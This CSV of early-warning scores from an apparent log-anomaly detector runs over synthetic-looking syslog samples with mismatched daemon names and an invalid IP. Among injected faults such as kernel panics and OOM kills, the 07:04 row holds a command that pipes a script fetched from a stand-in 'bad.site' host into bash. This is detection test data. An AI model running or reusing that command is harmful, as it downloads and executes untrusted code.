bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 06:18:00,0.9999324178742043,1,1,0.8224995273096307,3,60,named: Started CUPS Scheduler. || telnetd: Finished Daily apt download activities. || kernel: Rotating log files. || smartd: Accepted publickey for user from 10.0.0.126 port 22 ssh2. || cups: Listening on LVM2 poll daemon socket. || chronyd: Started 
2026-07-01 06:19:00,0.9997396735475717,1,1,0.8224995273096307,3,58,unix_chkpwd: Listening on LVM2 poll daemon socket. || dockerd: Started Session c140 of user root. || unattended-upgrades: Synced RTC time from system clock. || docker: Started Session c167 of user root. || ntpd: Started CUPS Scheduler. || cups: Rotat
2026-07-01 06:20:00,0.9994703910710632,1,1,0.8224995273096307,3,62,rsyslogd: Synced RTC time from system clock. || logrotate: Synced RTC time from system clock. || sshd: Started CUPS Scheduler. || unattended-upgrades: Failed password for invalid user test from 192.168.1.27636 port 22 ssh2 || NetworkManager: Finished
2026-07-01 06:21:00,0.9997165548583968,1,1,0.8224995273096307,3,63,ntpd: Started Session c73 of user root. || dockerd: Listening on LVM2 poll daemon socket. || ufw: Synced RTC time from system clock. || gpm: Started CUPS Scheduler. || rsyslogd: Accepted publickey for user from 10.0.0.161 port 22 ssh2. || sudo: Start
2026-07-01 06:22:00,0.9998033838733332,1,1,0.8224995273096307,3,56,telnetd: Synced RTC time from system clock. || xinetd: Accepted publickey for user from 10.0.0.81 port 22 ssh2. || NetworkManager: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || docker: Finished Daily apt do
2026-07-01 06:23:00,0.9991954347346327,1,1,0.8224995273096307,3,59,chronyd: Started Cleanup of Temporary Directories. || sshd: Started CUPS Scheduler. || kernel: Started CUPS Scheduler. || logrotate: Synced RTC time from system clock. || redis-server: Started CUPS Scheduler. || unattended-upgrades: Started CUPS Sche
2026-07-01 06:24:00,0.999853254523747,1,1,0.8224995273096307,3,60,sshd: Started Session c65 of user root. || dockerd: Started Session c228 of user root. || NetworkManager: Listening on LVM2 poll daemon socket. || ftpd: Started CUPS Scheduler. || unattended-upgrades: Started Session c26 of user root. || unattended-u
2026-07-01 06:25:00,0.9998732668769663,1,1,0.8224995273096307,3,58,kernel: Listening on LVM2 poll daemon socket. || cups: Started CUPS Scheduler. || systemd-timesyncd: Synced RTC time from system clock. || named: Started Session c144 of user root. || cups: Started Cleanup of Temporary Directories. || docker: Started
2026-07-01 06:26:00,0.999746972674683,1,1,0.8224995273096307,3,60,NetworkManager: Synced RTC time from system clock. || chronyd: Rotating log files. || ufw: Accepted publickey for user from 10.0.0.235 port 22 ssh2. || rsyslogd: Started CUPS Scheduler. || dockerd: Synced RTC time from system clock. || docker: bash: 
2026-07-01 06:27:00,0.9996786991232206,1,1,0.8224995273096307,3,58,unattended-upgrades: Started CUPS Scheduler. || systemd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || systemd-timesyncd: kernel: Out of memory: Kill process 62540 (python3) score 987 or sacrifice child || 
2026-07-01 06:28:00,0.9992610778209376,1,1,0.8224995273096307,3,63,ufw: Started Session c42 of user root. || ftpd: Started Session c36 of user root. || cups: kernel: Kernel panic - not syncing: Fatal exception || CRON: Started Cleanup of Temporary Directories. || unix_chkpwd: Listening on LVM2 poll daemon socket. ||
2026-07-01 06:29:00,0.9991136314779255,1,1,0.8224995273096307,3,57,dockerd: Listening on LVM2 poll daemon socket. || systemd: Rotating log files. || NetworkManager: kernel: Kernel panic - not syncing: Fatal exception || rsyslogd: Started CUPS Scheduler. || smartd: Started Session c210 of user root. || redis-server: 
2026-07-01 06:30:00,0.9995974500775966,1,1,0.8224995273096307,3,56,named: Synced RTC time from system clock. || sudo: Started Cleanup of Temporary Directories. || docker: Started Cleanup of Temporary Directories. || xinetd: Listening on LVM2 poll daemon socket. || logrotate: Started CUPS Scheduler. || sshd: Listenin
2026-07-01 06:31:00,0.997232533428943,1,1,0.8224995273096307,3,58,redis-server: Started Session c97 of user root. || logrotate: Rotating log files. || dockerd: Accepted publickey for user from 10.0.0.194 port 22 ssh2. || dockerd: Rotating log files. || dockerd: Synced RTC time from system clock. || CRON: kernel: Ou
2026-07-01 06:32:00,0.9991626712207797,1,1,0.8224995273096307,3,59,chronyd: Started Cleanup of Temporary Directories. || xinetd: Accepted publickey for user from 10.0.0.240 port 22 ssh2. || ntpd: Accepted publickey for user from 10.0.0.253 port 22 ssh2. || docker: Started Session c30 of user root. || systemd: Listen
2026-07-01 06:33:00,0.9987976195817984,1,1,0.8224995273096307,3,59,gpm: Started Cleanup of Temporary Directories. || cups: Started CUPS Scheduler. || CRON: Listening on LVM2 poll daemon socket. || kernel: Started Cleanup of Temporary Directories. || ntpd: Finished Daily apt download activities. || named: Rotating lo
2026-07-01 06:34:00,0.9986070873994082,1,1,0.8224995273096307,3,58,redis-server: kernel: Out of memory: Kill process 3624 (python3) score 987 or sacrifice child || rsyslogd: Rotating log files. || named: Synced RTC time from system clock. || rsyslogd: Listening on LVM2 poll daemon socket. || ftpd: Finished Daily apt
2026-07-01 06:35:00,0.9950772928574451,1,1,0.8224995273096307,3,61,rsyslogd: Accepted publickey for user from 10.0.0.77 port 22 ssh2. || telnetd: Rotating log files. || smartd: Started Session c74 of user root. || rsyslogd: Started Cleanup of Temporary Directories. || unix_chkpwd: Accepted publickey for user from 10
2026-07-01 06:36:00,0.9998728606779492,1,1,0.8224995273096307,3,56,systemd: Accepted publickey for user from 10.0.0.211 port 22 ssh2. || xinetd: Started Session c73 of user root. || logrotate: Listening on LVM2 poll daemon socket. || logrotate: Started Session c193 of user root. || rsyslogd: kernel: Kernel panic - n
2026-07-01 06:37:00,0.9850815601498006,1,1,0.8224995273096307,3,59,named: Started Session c32 of user root. || ntpd: Started CUPS Scheduler. || cups: Started Session c243 of user root. || smartd: Started Cleanup of Temporary Directories. || ufw: Accepted publickey for user from 10.0.0.201 port 22 ssh2. || logrotate:
2026-07-01 06:38:00,0.9525366582983013,1,1,0.8224995273096307,3,59,cups: Started CUPS Scheduler. || telnetd: Started CUPS Scheduler. || xinetd: Rotating log files. || kernel: Finished Daily apt download activities. || kernel: Rotating log files. || systemd-timesyncd: Started Cleanup of Temporary Directories. || syst
2026-07-01 06:39:00,0.9994456358397029,1,1,0.8224995273096307,3,58,docker: Listening on LVM2 poll daemon socket. || cups: Finished Daily apt download activities. || telnetd: Listening on LVM2 poll daemon socket. || sudo: Finished Daily apt download activities. || telnetd: Started CUPS Scheduler. || cups: Synced RTC 
2026-07-01 06:40:00,0.9997190793351154,1,1,0.8224995273096307,3,60,systemd: Started Cleanup of Temporary Directories. || ftpd: Started CUPS Scheduler. || systemd: Started Cleanup of Temporary Directories. || docker: Accepted publickey for user from 10.0.0.161 port 22 ssh2. || NetworkManager: Started CUPS Scheduler. 
2026-07-01 06:41:00,0.9970889461299294,1,1,0.8224995273096307,3,65,telnetd: Synced RTC time from system clock. || rsyslogd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Started Cleanup of Temporary Directories. || dockerd: Listening on LVM2 poll daemon socket. || NetworkManager: Listening on LVM2 poll
2026-07-01 06:42:00,0.9984655472442973,1,1,0.8224995273096307,3,57,ftpd: Started CUPS Scheduler. || cups: Rotating log files. || rsyslogd: Listening on LVM2 poll daemon socket. || chronyd: Started CUPS Scheduler. || ftpd: Started Cleanup of Temporary Directories. || ufw: Started Session c69 of user root. || xinetd: 
2026-07-01 06:43:00,0.9997142448073595,1,1,0.8224995273096307,3,61,gpm: Started Cleanup of Temporary Directories. || ufw: Accepted publickey for user from 10.0.0.208 port 22 ssh2. || ntpd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || gpm: Accepted publickey for user from 
2026-07-01 06:44:00,0.9997333657527602,1,1,0.8224995273096307,3,61,sshd: Listening on LVM2 poll daemon socket. || ftpd: Rotating log files. || unix_chkpwd: Started Session c211 of user root. || cups: Accepted publickey for user from 10.0.0.26 port 22 ssh2. || dockerd: Rotating log files. || ftpd: Listening on LVM2 p
2026-07-01 06:45:00,0.9999291354750198,1,1,0.8224995273096307,3,59,unattended-upgrades: Started Cleanup of Temporary Directories. || telnetd: Listening on LVM2 poll daemon socket. || gpm: Started CUPS Scheduler. || systemd-timesyncd: Finished Daily apt download activities. || redis-server: Synced RTC time from syste
2026-07-01 06:46:00,0.9999507756777408,1,1,0.8224995273096307,3,62,redis-server: Synced RTC time from system clock. || named: Rotating log files. || unix_chkpwd: Started Session c164 of user root. || xinetd: Finished Daily apt download activities. || ftpd: kernel: Out of memory: Kill process 30814 (python3) score 98
2026-07-01 06:47:00,0.999928449595227,1,1,0.8224995273096307,3,57,docker: Started Cleanup of Temporary Directories. || gpm: Finished Daily apt download activities. || docker: Started Cleanup of Temporary Directories. || ftpd: Finished Daily apt download activities. || gpm: Started CUPS Scheduler. || docker: Finishe
2026-07-01 06:48:00,0.999948547983535,1,1,0.8224995273096307,3,56,sudo: Accepted publickey for user from 10.0.0.238 port 22 ssh2. || ntpd: Started Cleanup of Temporary Directories. || chronyd: Finished Daily apt download activities. || ftpd: Accepted publickey for user from 10.0.0.10 port 22 ssh2. || xinetd: Starte
2026-07-01 06:49:00,0.9999127766169855,1,1,0.8224995273096307,3,56,xinetd: Synced RTC time from system clock. || logrotate: Started Session c37 of user root. || sudo: Started Session c188 of user root. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || gpm: Started CUPS Scheduler. || sshd: Finished Daily
2026-07-01 06:50:00,0.9974063548560462,1,1,0.8224995273096307,3,58,CRON: Finished Daily apt download activities. || ntpd: Accepted publickey for user from 10.0.0.138 port 22 ssh2. || ftpd: Rotating log files. || kernel: Synced RTC time from system clock. || kernel: Finished Daily apt download activities. || smartd: 
2026-07-01 06:51:00,0.9961980425669625,1,1,0.8224995273096307,3,59,gpm: Started Cleanup of Temporary Directories. || named: Listening on LVM2 poll daemon socket. || telnetd: Started Cleanup of Temporary Directories. || kernel: Accepted publickey for user from 10.0.0.145 port 22 ssh2. || logrotate: Listening on LVM2 
2026-07-01 06:52:00,0.9971316320590949,1,1,0.8224995273096307,3,60,chronyd: Rotating log files. || redis-server: Finished Daily apt download activities. || gpm: Accepted publickey for user from 10.0.0.120 port 22 ssh2. || dockerd: Started Session c214 of user root. || ntpd: Rotating log files. || unix_chkpwd: Accept
2026-07-01 06:53:00,0.9982158441360995,1,1,0.8224995273096307,3,59,docker: Rotating log files. || redis-server: Rotating log files. || smartd: Finished Daily apt download activities. || CRON: Listening on LVM2 poll daemon socket. || telnetd: Listening on LVM2 poll daemon socket. || NetworkManager: Synced RTC time fr
2026-07-01 06:54:00,0.9998773864148837,1,1,0.8224995273096307,3,62,systemd: Started Session c219 of user root. || dockerd: Accepted publickey for user from 10.0.0.31 port 22 ssh2. || logrotate: Finished Daily apt download activities. || ntpd: Started Session c67 of user root. || sudo: Started Cleanup of Temporary Di
2026-07-01 06:55:00,0.9997924788393097,1,1,0.8224995273096307,3,61,smartd: Started Cleanup of Temporary Directories. || docker: Started Session c13 of user root. || systemd-timesyncd: Accepted publickey for user from 10.0.0.198 port 22 ssh2. || unattended-upgrades: Started Cleanup of Temporary Directories. || chrony
2026-07-01 06:56:00,0.9992378614107396,1,1,0.8224995273096307,3,58,docker: Started Cleanup of Temporary Directories. || gpm: Accepted publickey for user from 10.0.0.103 port 22 ssh2. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || rsyslogd: Started Session c218 of user root. || logrotate: [UFW BLOCK] 
2026-07-01 06:57:00,0.9992249229422512,1,1,0.8224995273096307,3,63,ntpd: Finished Daily apt download activities. || ufw: Finished Daily apt download activities. || dockerd: Started Cleanup of Temporary Directories. || ufw: Started Session c145 of user root. || logrotate: Listening on LVM2 poll daemon socket. || xine
2026-07-01 06:58:00,0.9890734437189045,1,1,0.8224995273096307,3,60,gpm: Accepted publickey for user from 10.0.0.44 port 22 ssh2. || sudo: Started CUPS Scheduler. || sudo: Accepted publickey for user from 10.0.0.87 port 22 ssh2. || logrotate: Rotating log files. || ufw: Listening on LVM2 poll daemon socket. || Networ
2026-07-01 06:59:00,0.9958044732253275,1,1,0.8224995273096307,3,62,kernel: Started CUPS Scheduler. || systemd: Started Cleanup of Temporary Directories. || unix_chkpwd: Listening on LVM2 poll daemon socket. || kernel: Synced RTC time from system clock. || cups: Rotating log files. || sshd: Rotating log files. || ufw
2026-07-01 07:00:00,0.9893889638215377,1,1,0.8224995273096307,3,57,rsyslogd: Accepted publickey for user from 10.0.0.70 port 22 ssh2. || unattended-upgrades: Synced RTC time from system clock. || redis-server: Listening on LVM2 poll daemon socket. || chronyd: Started CUPS Scheduler. || CRON: Finished Daily apt downl
2026-07-01 07:01:00,0.9988123211331138,1,1,0.8224995273096307,3,61,ftpd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || sshd: Synced RTC time from system clock. || telnetd: Started Cleanup of Temporary Directories. || sudo: Finished Daily apt download activities. 
2026-07-01 07:02:00,0.997644796529238,1,1,0.8224995273096307,3,58,sudo: Finished Daily apt download activities. || ntpd: Synced RTC time from system clock. || telnetd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || NetworkManager: Started CUPS Scheduler. || chronyd: Starte
2026-07-01 07:03:00,0.9905355978582225,1,1,0.8224995273096307,3,60,ufw: Listening on LVM2 poll daemon socket. || rsyslogd: Started CUPS Scheduler. || CRON: Listening on LVM2 poll daemon socket. || gpm: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || dockerd: kernel
2026-07-01 07:04:00,0.9906781785181548,1,1,0.8224995273096307,3,58,cups: Synced RTC time from system clock. || sshd: Finished Daily apt download activities. || sshd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || logrotate: Finished Daily apt download activities. || sshd: Listening on LVM2 poll daemon s
2026-07-01 07:05:00,0.9997311666645581,1,1,0.8224995273096307,3,65,ufw: Finished Daily apt download activities. || NetworkManager: Started Cleanup of Temporary Directories. || unattended-upgrades: Started Session c234 of user root. || docker: Rotating log files. || ntpd: Started CUPS Scheduler. || rsyslogd: Accepted
